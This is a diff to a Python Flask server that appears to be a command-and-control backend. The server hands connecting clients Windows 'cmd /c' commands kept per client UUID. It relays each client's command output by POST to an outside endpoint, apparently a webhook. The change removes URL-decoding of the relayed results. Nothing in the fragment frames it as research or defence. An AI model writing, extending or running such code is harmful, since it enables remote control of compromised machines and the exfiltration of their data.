@@ -25,8 +25,8 @@ def index():
         nonce += 1
         return f"command successfully set to {uuiddict[uuid]}"
     if result is not None:
-        print(requests.utils.unquote(result))
-        resp = requests.post(out, json={"content":requests.utils.unquote(result)})
+        print(result)
+        resp = requests.post(out, json={"content": result})
         print(resp.text)
         return ""
     else:
@@ -34,6 +34,7 @@ def index():
             return f"cmd /c \"{uuiddict[uuid]}\" && echo \"nonce={nonce}\""
         except KeyError:
             return f"cmd /c \"{uuiddict[None]}\" && echo \"nonce={nonce}\""
+
 
 @app.route('/wipecmds')
 def wipe():
